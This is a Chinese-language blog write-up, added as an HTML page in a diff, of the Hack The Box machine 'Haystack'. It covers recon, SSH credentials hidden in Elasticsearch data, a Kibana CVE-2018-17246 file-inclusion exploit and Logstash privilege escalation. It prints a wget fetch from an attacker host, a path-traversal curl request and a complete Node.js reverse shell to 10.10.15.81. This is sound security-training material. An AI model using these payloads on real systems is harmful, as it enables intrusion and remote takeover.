@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="misc,ELK,logstash,CVE-2018-17246,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介靶机状态: rooted.">
+<meta name="keywords" content="misc,ELK,logstash,CVE-2018-17246">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB linux Haystack">
+<meta property="og:url" content="https://exexute.github.io/2019/08/29/HTB-linux-Haystack/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介靶机状态: rooted.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.044Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB linux Haystack">
+<meta name="twitter:description" content="简介靶机状态: rooted.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/08/29/HTB-linux-Haystack/">
+
+
+
+
+
+  <title>HTB linux Haystack | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/08/29/HTB-linux-Haystack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB linux Haystack</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-29T11:51:19+08:00">
+                2019-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>靶机状态: rooted.</p>
+<a id="more"></a>
+<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
+<li>信息收集</li>
+<li>shell: security</li>
+<li>priv: security -&gt; kibana</li>
+<li>priv: kibana -&gt; root</li>
+</ul>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>1.nmap扫描端口</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sC -sV -oA nmap/Haystack 10.10.10.115</span><br><span class="line"><span class="comment"># Nmap 7.70 scan initiated Tue Jul  9 21:59:56 2019 as: nmap -sC -sV -oA nmap/Haystack 10.10.10.115</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.115</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)</span><br><span class="line">|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)</span><br><span class="line">|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.12.2</span><br><span class="line">|_http-server-header: nginx/1.12.2</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">9200/tcp open  http    nginx 1.12.2</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.12.2</span></span><br><span class="line"><span class="string">|_http-title: Site doesn'</span>t have a title (application/json; charset=UTF-8).</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Jul  9 22:01:37 2019 -- 1 IP address (1 host up) scanned in 101.05 seconds</span></span><br></pre></td></tr></table></figure>
+<p>访问80和9200端口后，得到如下信息：</p>
+<ul>
+<li style="list-style: none"><input type="checkbox" checked> 22端口ssh服务，版本 OpenSSh 7.4</li>
+<li style="list-style: none"><input type="checkbox" checked> 80端口WEB服务，版本 nginx 1.12.2，页面内容为一副“扎在草堆中的一根针”的图片，jpg格式，文件名为needle.jpg(针)</li>
+<li style="list-style: none"><input type="checkbox" checked> 9200端口ElasticSearch服务，版本 6.4.2，RPM包方式安装</li>
+</ul>
+<p>2.searchsploit查历史exp<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx 1.12.2</span></span><br><span class="line">$ searchsploit nginx 1.</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                       |  Path</span><br><span class="line">                                                                                                                     | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Nginx 0.7.0 &lt; 0.7.61 / 0.6.0 &lt; 0.6.38 / 0.5.0 &lt; 0.5.37 / 0.4.0 &lt; 0.4.14 - Denial of Service (PoC)                    | exploits/linux/dos/9901.txt</span><br><span class="line">Nginx 1.1.17 - URI Processing SecURIty Bypass                                                                        | exploits/multiple/remote/38846.txt</span><br><span class="line">Nginx 1.3.9 &lt; 1.4.0 - Chuncked Encoding Stack Buffer Overflow (Metasploit)                                           | exploits/linux/remote/25775.rb</span><br><span class="line">Nginx 1.3.9 &lt; 1.4.0 - Denial of Service (PoC)                                                                        | exploits/linux/dos/25499.py</span><br><span class="line">Nginx 1.3.9/1.4.0 (x86) - Brute Force                                                                                | exploits/linux_x86/remote/26737.pl</span><br><span class="line">Nginx 1.4.0 (Generic Linux x64) - Remote Overflow                                                                    | exploits/linux_x86-64/remote/32277.txt</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">Papers: No Result</span><br><span class="line"></span><br><span class="line"><span class="comment"># ElasticSearch 6.5.2</span></span><br><span class="line">$ searchsploit ElasticSearch 6</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                       |  Path</span><br><span class="line">                                                                                                                     | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">ElasticSearch - Remote Code Execution                                                                                | exploits/linux/remote/36337.py</span><br><span class="line">ElasticSearch - Search Groovy Sandbox Bypass (Metasploit)                                                            | exploits/java/remote/36415.rb</span><br><span class="line">ElasticSearch 1.6.0 - Arbitrary File Download                                                                        | exploits/linux/webapps/38383.py</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">Papers: No Result</span><br></pre></td></tr></table></figure></p>
+<p>nginx和es无直接利用的exp，配合google搜索均为发现，于是放弃<strong>N Day</strong>这条路。</p>
+<h4 id="shell-security"><a href="#shell-security" class="headerlink" title="shell: security"></a>shell: security</h4><p>Elasticsearch是一个基于Lucene库的搜寻引擎。它提供了一个分布式、支持多租户的全文搜索引擎，具有HTTP Web接口和无模式JSON文档。 Elasticsearch是用Java开发的，并在Apache许可证下作为开源软体发布。官方客户端在Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜寻引擎，其次是Apache Solr，也是基于Lucene。<a href="https://en.wikipedia.org/wiki/Elasticsearch" target="_blank" rel="noopener">wikipedia</a><br>简言之，ES是一个查询速度极快的数据库，用于企业级数据搜索，可作为数据库数据的缓存层。既然是存数据，就可能保存账号密码等敏感信息，盘它。</p>
+<p>由于直接在elasticsearch-head中查询，速度太慢，因此先用<a href="https://github.com/taskrabbit/elasticsearch-dump.git" target="_blank" rel="noopener">elasticsearch-dump</a>工具dump出es索引中的数据。</p>
+<p>一番操作之后，发现needle关键字找不到任何有意思的东西，于是查看了forum论坛上的tips，发现needle.jpg里有隐藏的信息，之前被我忽略了，回去看图片：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先strings大致找一下，不行再上工具</span></span><br><span class="line">$ strings needles.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现一个base64编码的字符串，jpg里正常情况是不会有base64的</span></span><br><span class="line">$ <span class="built_in">echo</span> bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d</span><br><span class="line">la aguja en el pajar es <span class="string">"clave"</span></span><br></pre></td></tr></table></figure></p>
+<p>发现了”clave”，这里我傻不拉几的翻译为了英文，然后发现进入死循环，于是，直接在es中查关键字”clave”找到账号密码：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat elasticsearch/quotes.json|grep clave</span><br><span class="line">&#123;<span class="string">"_index"</span>:<span class="string">"quotes"</span>,<span class="string">"_type"</span>:<span class="string">"quote"</span>,<span class="string">"_id"</span>:<span class="string">"111"</span>,<span class="string">"_score"</span>:1,<span class="string">"_source"</span>:&#123;<span class="string">"quote"</span>:<span class="string">"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">"_index"</span>:<span class="string">"quotes"</span>,<span class="string">"_type"</span>:<span class="string">"quote"</span>,<span class="string">"_id"</span>:<span class="string">"45"</span>,<span class="string">"_score"</span>:1,<span class="string">"_source"</span>:&#123;<span class="string">"quote"</span>:<span class="string">"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># decode base64</span></span><br><span class="line">$ <span class="built_in">echo</span> cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d</span><br><span class="line">pass: spanish.is.key</span><br><span class="line">$ <span class="built_in">echo</span> dXNlcjogc2VjdXJpdHkg | base64 -d</span><br><span class="line">user: security</span><br></pre></td></tr></table></figure></p>
+<p>登陆ssh，获得security权限。</p>
+<h4 id="priv-security-gt-kibana"><a href="#priv-security-gt-kibana" class="headerlink" title="priv: security -&gt; kibana"></a>priv: security -&gt; kibana</h4><p>进入shell后，用<a href>LinEnum.sh</a>检查可提权的内容，发现存在kibana服务，从<code>ps</code>结果找到配置文件位置”/usr/share/kibana/README.txt”，发现配置文件版本：kibana 6.4.2，google发现存在N Day CVE-2018-17246。</p>
+<p>1.简介<br>kibana是Elastic公司开源的一款由node编写的数据展示工具，用来创建可视化图表。<a href="https://www.elastic.co/cn/products/kibana" target="_blank" rel="noopener">官方地址</a></p>
+<p>2.漏洞分析<br>查exp发现漏洞触发点位于”/api/console/api_server”，在<a href>git</a>上搜索api_server可以找到api_server]的目录”src\core_plugins/console/server/api_server”，漏洞触发的关键代码如下：(官方仓库已经移除有漏洞的代码)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolveApi</span>(<span class="params">senseVersion, apis, h</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> result = &#123;&#125;;</span><br><span class="line">  _.each(apis, <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> api = <span class="built_in">require</span>(<span class="string">'./'</span> + name);</span><br><span class="line">        result[name] = api.asJson();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> h.response(result).type(<span class="string">'application/json'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从上面代码中可以看到，resolveApi在接收到apis参数的数据后，未进行验证直接进行require，导致了node文件包含漏洞。</p>
+<p>3.利用<a href="https://github.com/buffered4ever/Exploits/tree/master/cve-2018-17246" target="_blank" rel="noopener">cve</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /tmp &amp;&amp; wget 10.10.15.81/shell.js</span><br><span class="line">$ curl <span class="string">"localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=./../../../../../../../../tmp/shell.js"</span></span><br></pre></td></tr></table></figure></p>
+<p>4.exp代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">"/bin/bash"</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">1337</span>, <span class="string">"10.10.15.81"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application form crashing</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<h4 id="priv-kibana-gt-root"><a href="#priv-kibana-gt-root" class="headerlink" title="priv: kibana -&gt; root"></a>priv: kibana -&gt; root</h4><p>进入kibana后，依旧先运行LinEnum.sh，在运行的进程中找到以root权限运行的logstash，Logstash 是开源的服务器端数据处理管道，能够同时从多个来源采集数据，转换数据，然后将数据发送到您最喜欢的“存储库”中。ElasticSearch、Logstash和Kibana合称为ELK，用于日志的收集及图形化展示。</p>
+<p>logstash具有执行系统命令的功能，因此先查看其配置”/etc/logstash/conf.d”，在output.conf中发现通过exec将数据发送出去，配合input.conf和filter.conf找到提权的方法：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"Ejecutar comando : /usr/share/kibana/node/bin/node /tmp/shell.js"</span> &gt; /opt/kibana/logstash_owefsad</span><br></pre></td></tr></table></figure></p>
+<p>拿到root权限。<br>来收集系统数据的功能，因此，</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/misc/" rel="tag"># misc</a>
+          
+            <a href="/tags/ELK/" rel="tag"># ELK</a>
+          
+            <a href="/tags/logstash/" rel="tag"># logstash</a>
+          
+            <a href="/tags/CVE-2018-17246/" rel="tag"># CVE-2018-17246</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/22/HTB-windows-Arkman/" rel="next" title="HTB-windows-Arkman">
+                <i class="fa fa-chevron-left"></i> HTB-windows-Arkman
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/29/HTB-linux-Craft/" rel="prev" title="HTB linux Craft">
+                HTB linux Craft <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#目录"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-security"><span class="nav-number">3.</span> <span class="nav-text">shell: security</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#priv-security-gt-kibana"><span class="nav-number">4.</span> <span class="nav-text">priv: security -&gt; kibana</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#priv-kibana-gt-root"><span class="nav-number">5.</span> <span class="nav-text">priv: kibana -&gt; root</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
